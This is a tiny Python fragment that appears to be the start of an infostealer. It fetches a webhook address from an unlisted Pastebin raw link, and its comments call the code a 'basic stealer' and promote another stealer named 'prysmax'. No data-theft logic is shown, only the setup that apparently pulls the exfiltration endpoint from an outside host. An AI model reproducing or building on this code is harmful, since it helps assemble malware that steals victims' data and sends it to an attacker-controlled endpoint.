import requests

hook = requests.get("https://pastebin.com/raw/U-LINK-HERE").text # create a pastebin unlisted and put here, FORMAT RAW IMPORTANT

# soon new features xd. This is basic stealer, prysmax it's +++ powerfull
